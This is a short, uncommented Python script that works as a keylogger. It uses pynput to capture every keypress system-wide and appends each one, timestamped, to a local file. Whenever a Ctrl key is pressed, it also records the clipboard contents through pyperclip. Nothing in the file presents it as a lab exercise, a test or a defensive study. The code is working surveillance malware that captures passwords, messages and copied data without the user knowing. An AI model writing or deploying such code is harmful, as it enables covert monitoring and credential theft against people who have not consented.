from pynput.keyboard import Key
from pynput import keyboard
import pyperclip as pc
from datetime import datetime

def keypress_event(key):
    f = open("keypress_logs", 'a')
    if key == Key.ctrl_l or key == Key.ctrl_r:
        f.write(f"Clipboard content on {datetime.now()}: {pc.paste()}\n")
    else:
        f.write(f"Alphanumeric key pressed on {datetime.now()}: {key}\n")
    f.close()

with keyboard.Listener(on_press = keypress_event) as listener:
    listener.join()
